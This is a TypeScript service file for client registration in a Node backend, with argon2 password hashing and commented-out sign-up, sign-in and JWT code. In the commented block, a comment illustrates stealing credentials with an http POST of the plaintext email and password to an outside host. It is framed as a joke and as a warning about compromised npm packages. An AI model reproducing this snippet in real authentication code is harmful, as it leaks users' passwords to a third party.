import { Service, Inject } from 'typedi'
import config from '../../config'

import jwt from 'jsonwebtoken'


import argon2 from 'argon2'
import { randomBytes } from 'crypto'

import { UserPassword } from '../domain/user/userPassword'

import { Either, left, right } from '../core/logic/Result'
import IClientService, { ClientErrorCode, ClientErrorResult } from './IServices/IClientService'
import IClientRepo from './IRepos/IClientRepo'
import { IClientDTO } from '../dto/IClientDTO'
import { ICreatedClientDTO } from '../dto/ICreatedClientDTO'
import { Email } from '../domain/user/email'
import Client from '../domain/user/client/Client'
import { Name } from '../domain/user/name'
import { PhoneNumber } from '../domain/user/phoneNumber'
import { VatNumber } from '../domain/user/client/vatNumber'
import { ClientMap } from '../mappers/ClientMap'

@Service()
export default class ClientService implements IClientService {
    constructor(
        @Inject(config.repos.client.name) private repo: IClientRepo,
    ) { }

    async createClient(dto: IClientDTO): Promise<Either<ClientErrorResult, ICreatedClientDTO>> {
        try {
            const email = Email.create(dto.email).getOrThrow()

            const exists = await this.repo.find(email)
            if (!!exists) {
                return left({
                    errorCode: ClientErrorCode.AlreadyExists,
                    message: `User already exists: ${email.value}`
                })
            }

            const password = await this.hashPassword(dto.password)

            const name = Name.create(dto.name).getOrThrow()
            const phoneNumber = PhoneNumber.create(dto.phoneNumber).getOrThrow()
            const vatNumber = VatNumber.create(dto.vatNumber).getOrThrow()

            const client = Client.create({
                email,
                name,
                phoneNumber,
                vatNumber,
                password
            }).getOrThrow()

            const saved = await this.repo.save(client)
            // TODO: TOKEN
            const clientDTO = ClientMap.toDTO(saved)

            return right(clientDTO)
        } catch (e) {
            return left({
                errorCode: ClientErrorCode.BussinessRuleViolation,
                message: e.message
            })
        }
    }

    // TODO: refactor outside
    private async hashPassword(password: string): Promise<UserPassword> {
        const salt = randomBytes(32)
        const hashedPassword = await argon2.hash(password, { salt })

        const pass = UserPassword.create({ value: hashedPassword, hashed: true })
        if (pass.isFailure) {
            return Promise.reject(pass.errorValue())
        }

        return pass.getValue()
    }

    // public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO; token: string }>> {
    //     try {
    //         const userDocument = await this.userRepo.findByEmail(userDTO.email)
    //         const found = !!userDocument

    //         if (found) {
    //             return Result.fail<{ userDTO: IUserDTO; token: string }>(
    //                 'User already exists with email=' + userDTO.email,
    //             )
    //         }

    //         /**
    //          * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
    //          * require('http')
    //          *  .request({
    //          *     hostname: 'http://my-other-api.com/',
    //          *     path: '/store-credentials',
    //          *     port: 80,
    //          *     method: 'POST',
    //          * }, ()=>{}).write(JSON.stringify({ email, password })).end();
    //          *
    //          * Just kidding, don't do that!!!
    //          *
    //          * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
    //          * watches every API call and if it spots a 'password' and 'email' property then
    //          * it decides to steal them!? Would you even notice that? I wouldn't :/
    //          */

    //         const salt = randomBytes(32)
    //         this.logger.silly('Hashing password')
    //         const hashedPassword = await argon2.hash(userDTO.password, { salt })
    //         this.logger.silly('Creating user db record')

    //         const password = await UserPassword.create({ value: hashedPassword, hashed: true }).getValue()
    //         const email = await UserEmail.create(userDTO.email).getValue()
    //         let role: Role

    //         const roleOrError = await this.getRole(userDTO.role)
    //         if (roleOrError.isFailure) {
    //             return Result.fail<{ userDTO: IUserDTO; token: string }>(roleOrError.error)
    //         } else {
    //             role = roleOrError.getValue()
    //         }

    //         const userOrError = await User.create({
    //             firstName: userDTO.firstName,
    //             lastName: userDTO.lastName,
    //             email: email,
    //             role: role,
    //             password: password,
    //         })

    //         if (userOrError.isFailure) {
    //             throw Result.fail<IUserDTO>(userOrError.errorValue())
    //         }

    //         const userResult = userOrError.getValue()

    //         this.logger.silly('Generating JWT')
    //         const token = this.generateToken(userResult)

    //         this.logger.silly('Sending welcome email')
    //         //await this.mailer.SendWelcomeEmail(userResult);

    //         //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });

    //         await this.userRepo.save(userResult)
    //         const userDTOResult = UserMap.toDTO(userResult) as IUserDTO
    //         return Result.ok<{ userDTO: IUserDTO; token: string }>({ userDTO: userDTOResult, token: token })
    //     } catch (e) {
    //         this.logger.error(e)
    //         throw e
    //     }
    // }

    // public async SignIn(email: string, password: string): Promise<Result<{ userDTO: IUserDTO; token: string }>> {
    //     const user = await this.userRepo.findByEmail(email)

    //     if (!user) {
    //         throw new Error('User not registered')
    //     }

    //     /**
    //      * We use verify from argon2 to prevent 'timing based' attacks
    //      */
    //     this.logger.silly('Checking password')
    //     const validPassword = await argon2.verify(user.password.value, password)
    //     if (validPassword) {
    //         this.logger.silly('Password is valid!')
    //         this.logger.silly('Generating JWT')
    //         const token = this.generateToken(user) as string

    //         const userDTO = UserMap.toDTO(user) as IUserDTO
    //         return Result.ok<{ userDTO: IUserDTO; token: string }>({ userDTO: userDTO, token: token })
    //     } else {
    //         throw new Error('Invalid Password')
    //     }
    // }

    // private generateToken(user) {
    //     const today = new Date()
    //     const exp = new Date(today)
    //     exp.setDate(today.getDate() + 60)

    //     /**
    //      * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
    //      * The cool thing is that you can add custom properties a.k.a metadata
    //      * Here we are adding the userId, role and name
    //      * Beware that the metadata is public and can be decoded without _the secret_
    //      * but the client cannot craft a JWT to fake a userId
    //      * because it doesn't have _the secret_ to sign it
    //      * more information here: https://softwareontheroad.com/you-dont-need-passport
    //      */
    //     this.logger.silly(`Sign JWT for userId: ${user._id}`)

    //     const id = user.id.toString()
    //     const email = user.email.value
    //     const firstName = user.firstName
    //     const lastName = user.lastName
    //     const role = user.role.name

    //     return jwt.sign(
    //         {
    //             id: id,
    //             email: email, // We are gonna use this in the middleware 'isAuth'
    //             role: role,
    //             firstName: firstName,
    //             lastName: lastName,
    //             exp: exp.getTime() / 1000,
    //         }as UserToken,
    //         config.jwtSecret,
    //     )
    // }

    // private async getRole(roleId: string): Promise<Result<Role>> {
    //     const role = await this.roleRepo.findByDomainId(roleId)
    //     const found = !!role

    //     if (found) {
    //         return Result.ok<Role>(role)
    //     } else {
    //         return Result.fail<Role>("Couldn't find role by id=" + roleId)
    //     }
    // }
}
